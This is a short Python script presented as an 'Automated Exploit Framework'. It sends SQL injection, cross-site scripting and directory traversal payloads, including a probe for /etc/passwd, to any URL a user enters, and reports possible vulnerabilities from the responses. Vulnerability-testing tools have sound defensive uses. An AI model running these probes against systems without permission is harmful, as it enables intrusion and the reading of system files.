"""
Automated Exploit Framework
Developer: Ronald Baker
Company: Mavericks Umbrella LLC

Disclaimer:
This software is provided by Mavericks Umbrella LLC "as-is" and without any warranties or conditions,
express or implied, including but not limited to the implied warranties of merchantability and fitness for a particular purpose.
In no event shall Mavericks Umbrella LLC or its contributors be liable for any direct, indirect, incidental,
special, exemplary, or consequential damages (including but not limited to procurement of substitute goods or services;
loss of use, data, or profits; or business interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of
the use of this software, even if advised of the possibility of such damage.

This script automates common web application exploit tests, including:
- SQL Injection
- Cross-Site Scripting (XSS)
- Directory Traversal

Instructions:
1. Run the script from the terminal.
2. Select an exploit type from the menu.
3. Enter the target URL for the test.
4. The script will perform the test and display results.

Required Libraries:
- requests (Install with `pip install requests`)

Usage:
python3 automated_exploit_framework.py
"""

import requests

def test_sql_injection(target_url):
    """
    Tests for SQL Injection vulnerabilities.

    :param target_url: The target URL to test.
    """
    payload = "' OR '1'='1"
    print("\n[SQL Injection Test]")
    try:
        response = requests.get(target_url, params={"input": payload}, timeout=5)
        if "syntax" in response.text.lower() or "error" in response.text.lower():
            print(f"Potential SQL Injection vulnerability detected at: {target_url}")
        else:
            print("No SQL Injection vulnerability detected.")
    except Exception as e:
        print(f"Error testing for SQL Injection: {e}")

def test_xss(target_url):
    """
    Tests for Cross-Site Scripting (XSS) vulnerabilities.

    :param target_url: The target URL to test.
    """
    payload = "<script>alert('XSS');</script>"
    print("\n[Cross-Site Scripting (XSS) Test]")
    try:
        response = requests.get(target_url, params={"input": payload}, timeout=5)
        if payload in response.text:
            print(f"Potential XSS vulnerability detected at: {target_url}")
        else:
            print("No XSS vulnerability detected.")
    except Exception as e:
        print(f"Error testing for XSS: {e}")

def test_directory_traversal(target_url):
    """
    Tests for Directory Traversal vulnerabilities.

    :param target_url: The target URL to test.
    """
    payload = "../../../../etc/passwd"
    print("\n[Directory Traversal Test]")
    try:
        response = requests.get(target_url, params={"input": payload}, timeout=5)
        if "root:" in response.text:
            print(f"Potential Directory Traversal vulnerability detected at: {target_url}")
        else:
            print("No Directory Traversal vulnerability detected.")
    except Exception as e:
        print(f"Error testing for Directory Traversal: {e}")

if __name__ == "__main__":
    print("Welcome to the Automated Exploit Framework.")
    print("Developer: Ronald Baker")
    print("Company: Mavericks Umbrella LLC\n")

    # Display exploit menu
    print("Select an exploit to test:")
    print("1. SQL Injection")
    print("2. Cross-Site Scripting (XSS)")
    print("3. Directory Traversal")
    choice = input("Enter your choice (1/2/3): ")

    # Input target URL
    target_url = input("\nEnter the target URL (e.g., http://example.com/test): ")

    # Execute the chosen exploit test
    try:
        if choice == "1":
            test_sql_injection(target_url)
        elif choice == "2":
            test_xss(target_url)
        elif choice == "3":
            test_directory_traversal(target_url)
        else:
            print("Invalid choice. Exiting.")
    except Exception as e:
        print(f"An error occurred: {e}")

